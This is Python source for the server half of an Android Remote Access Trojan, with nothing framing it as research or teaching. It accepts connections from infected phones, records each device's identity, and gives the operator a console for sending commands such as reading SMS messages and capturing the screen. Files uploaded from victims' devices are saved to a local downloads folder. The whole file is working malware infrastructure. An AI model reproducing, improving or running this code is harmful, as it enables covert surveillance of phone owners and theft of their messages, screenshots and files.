# rat_server.py
import socket
import threading
import json
import os
import time
from rat_config import *

class RATServer:
    def __init__(self):
        self.server = None
        self.clients = {}
        self.running = False
        
    def start_server(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((SERVER_HOST, SERVER_PORT))
            self.server.listen(MAX_CLIENTS)
            self.running = True
            
            print(f"{Colors.GREEN}[+] RAT Server started on {SERVER_HOST}:{SERVER_PORT}{Colors.RESET}")
            print(f"{Colors.YELLOW}[+] Waiting for Android clients...{Colors.RESET}")
            
            # Accept connections thread
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Command interface thread
            cmd_thread = threading.Thread(target=self.command_interface)
            cmd_thread.daemon = True
            cmd_thread.start()
            
            accept_thread.join()
            
        except Exception as e:
            print(f"{Colors.RED}[!] Server start failed: {e}{Colors.RESET}")
            
    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server.accept()
                
                # Get client info
                client_info = client_socket.recv(1024).decode()
                if client_info:
                    info = json.loads(client_info)
                    client_id = info.get('device_id', str(client_address))
                    
                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': client_address,
                        'info': info,
                        'last_active': time.time()
                    }
                    
                    print(f"{Colors.GREEN}[+] Client connected: {client_id}{Colors.RESET}")
                    print(f"{Colors.CYAN}Device: {info.get('device_name', 'Unknown')}{Colors.RESET}")
                    print(f"{Colors.CYAN}Android: {info.get('android_version', 'Unknown')}{Colors.RESET}")
                    
                    # Send welcome message
                    welcome_msg = {
                        'status': 'connected',
                        'message': 'Connected to RAT Server',
                        'server_time': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    client_socket.send(json.dumps(welcome_msg).encode())
                    
                    # Start client handler thread
                    handler_thread = threading.Thread(target=self.handle_client, args=(client_id,))
                    handler_thread.daemon = True
                    handler_thread.start()
                    
            except Exception as e:
                print(f"{Colors.RED}[!] Connection error: {e}{Colors.RESET}")
                
    def handle_client(self, client_id):
        client_data = self.clients.get(client_id)
        if not client_data:
            return
            
        socket_client = client_data['socket']
        
        while self.running:
            try:
                # Receive data from client
                data = socket_client.recv(4096).decode()
                if data:
                    response = json.loads(data)
                    
                    if response.get('type') == 'update':
                        print(f"{Colors.MAGENTA}[Update] {client_id}: {response.get('message', '')}{Colors.RESET}")
                        
                    elif response.get('type') == 'data':
                        print(f"{Colors.BLUE}[Data] {client_id}:{Colors.RESET}")
                        print(json.dumps(response.get('data'), indent=2))
                        
                    elif response.get('type') == 'file':
                        file_name = response.get('file_name')
                        file_data = response.get('file_data')
                        
                        if file_data:
                            # Save file
                            save_path = f"downloads/{client_id}_{file_name}"
                            with open(save_path, 'wb') as f:
                                f.write(file_data.encode('latin-1'))
                            print(f"{Colors.GREEN}[+] File saved: {save_path}{Colors.RESET}")
                        
                    elif response.get('type') == 'error':
                        print(f"{Colors.RED}[Error] {client_id}: {response.get('message', '')}{Colors.RESET}")
                        
            except Exception as e:
                print(f"{Colors.RED}[!] Client handler error for {client_id}: {e}{Colors.RESET}")
                break
        
        # Remove client
        self.clients.pop(client_id, None)
        print(f"{Colors.YELLOW}[+] Client disconnected: {client_id}{Colors.RESET}")
        
    def command_interface(self):
        while self.running:
            print(f"\n{Colors.CYAN}{Colors.BOLD}" + "="*60)
            print("         RAT COMMAND INTERFACE")
            print("="*60 + f"{Colors.RESET}")
            
            print(f"{Colors.WHITE}Connected Clients:{Colors.RESET}")
            for client_id, data in self.clients.items():
                info = data['info']
                print(f"{Colors.YELLOW}  {client_id}{Colors.RESET} - {info.get('device_name')} ({info.get('android_version')})")
            
            print(f"\n{Colors.WHITE}Available Commands:{Colors.RESET}")
            for cmd, desc in COMMANDS.items():
                print(f"  {Colors.GREEN}{cmd}{Colors.RESET}: {desc}")
            
            print(f"\n{Colors.BLUE}Usage: <client_id> <command> [arguments]{Colors.RESET}")
            print(f"Example: device123 sms_read")
            print(f"Example: device123 screen_capture")
            
            cmd_input = input(f"{Colors.MAGENTA}[CMD] > {Colors.RESET}").strip()
            
            if cmd_input.lower() == 'exit':
                print(f"{Colors.YELLOW}[+] Shutting down server...{Colors.RESET}")
                self.running = False
                break
            
            elif cmd_input.lower() == 'clear':
                os.system('clear')
                continue
            
            elif cmd_input.lower() == 'help':
                continue
            
            elif cmd_input:
                parts = cmd_input.split()
                if len(parts) >= 2:
                    client_id = parts[0]
                    command = parts[1]
                    args = parts[2:] if len(parts) > 2 else []
                    
                    if client_id in self.clients:
                        self.send_command(client_id, command, args)
                    else:
                        print(f"{Colors.RED}[!] Client {client_id} not found{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[!] Invalid command format{Colors.RESET}")
                    
    def send_command(self, client_id, command, args):
        client_data = self.clients.get(client_id)
        if not client_data:
            return
        
        socket_client = client_data['socket']
        
        cmd_data = {
            'command': command,
            'args': args,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        try:
            socket_client.send(json.dumps(cmd_data).encode())
            print(f"{Colors.GREEN}[+] Command sent to {client_id}: {command}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to send command: {e}{Colors.RESET}")
            
    def stop_server(self):
        self.running = False
        if self.server:
            self.server.close()
        print(f"{Colors.YELLOW}[+] Server stopped{Colors.RESET}")

def main():
    server = RATServer()
    server.start_server()

if __name__ == "__main__":
    main()
